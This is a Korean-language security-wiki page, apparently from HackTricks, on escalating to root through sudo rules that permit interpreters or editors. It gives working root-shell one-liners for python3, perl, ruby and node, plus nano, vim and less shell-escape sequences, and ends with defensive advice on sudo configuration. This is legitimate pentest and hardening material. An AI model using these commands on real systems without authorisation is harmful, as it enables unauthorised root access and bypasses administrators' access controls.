# Sudo 명령어 악용

{{#include ../../banners/hacktricks-training.md}}

## Sudo에서 허용된 interpreter

`sudo -l`이 사용자가 root로 interpreter를 실행하도록 허용한다면, 이를 직접적인 code execution으로 간주해야 합니다. interpreter는 arbitrary code를 실행하도록 설계되었으므로, `python3`, `perl`, `ruby`, `lua`, `node` 또는 유사한 binary의 실행을 허용하는 rule은 일반적으로 root command execution과 동일합니다. 단, arguments가 엄격하게 제한되고 검증되는 경우는 예외입니다.

일반적인 검토 흐름:
```bash
sudo -l
sudo /usr/bin/python3 -c 'import os; os.system("id")'
sudo /usr/bin/python3 -c 'import os; os.system("/bin/sh")'
```
기타 인터프리터 예시:
```bash
sudo /usr/bin/perl -e 'exec "/bin/sh";'
sudo /usr/bin/ruby -e 'exec "/bin/sh"'
sudo /usr/bin/node -e 'require("child_process").spawn("/bin/sh", {stdio: [0,1,2]})'
```
정확한 경로가 중요합니다. sudo 규칙에서 `/usr/bin/python3`을 허용한다면 검증 시에도 해당 정확한 경로를 사용하세요:
```bash
sudo /usr/bin/python3 -c 'import os; os.setuid(0); os.setgid(0); os.system("/bin/sh")'
```
## Sudo-allowed editors

`sudo -l`이 사용자가 root 권한으로 interactive editor를 실행하도록 허용한다면, 이를 단순한 파일 편집 권한이 아닌 command-execution surface로 간주해야 합니다. Editor는 종종 shell commands를 실행하고, 임의의 파일을 읽고 쓰거나, editor 내부에서 external helpers를 호출할 수 있습니다.

일반적인 검토 흐름:
```bash
sudo -l
sudo /usr/bin/nano /etc/hosts
sudo /usr/bin/vim /etc/hosts
sudo /usr/bin/less /etc/hosts
```
### Nano command execution

`nano`가 sudo를 통해 허용되면 편집기 인터페이스에서 command execution이 가능할 수 있습니다:
```text
Ctrl+R
Ctrl+X
```
그런 다음 다음과 같은 command를 제공합니다:
```bash
id
/bin/sh
```
일부 터미널에서는 interactive shell에 standard streams를 리디렉션해야 할 수 있습니다:
```bash
reset; /bin/sh 1>&0 2>&0
```
정확한 키 시퀀스는 nano 버전과 build 옵션에 따라 달라질 수 있지만, 보안 문제는 동일합니다. editor가 root 권한으로 실행되며 external commands를 호출할 수 있습니다.

### 기타 일반적인 editor escapes

Vim-style editors는 일반적으로 `:!`를 통해 command execution 기능을 제공합니다:
```text
:!/bin/sh
```
`less`와 같은 Pager도 shell 실행 기능을 노출할 수 있습니다:
```text
!/bin/sh
```
## 방어 참고 사항

- `sudo`를 통해 interpreter 또는 interactive editor를 허용하지 마세요.
- 하나의 제한적인 관리 작업만 수행하는, 고정된 root 소유 wrapper를 우선 사용하세요.
- interpreter가 불가피한 경우 정확한 script 경로만 제한하고, 사용자가 제어하는 인자, 쓰기 가능한 import, `PYTHONPATH`, 안전하지 않은 환경 보존을 차단하세요.
- 파일 편집이 필요한 경우 정확한 파일 경로로 제한하고, 패치된 sudo 버전 및 엄격한 환경 처리를 사용하는 `sudoedit`를 고려하세요.
- `SETENV`, `env_keep`, 쓰기 가능한 작업 디렉터리, 쓰기 가능한 module/import 경로, `NOEXEC`, `use_pty`, logging을 검토하되, 이를 완전한 sandbox로 간주하지 마세요.

{{#include ../../banners/hacktricks-training.md}}
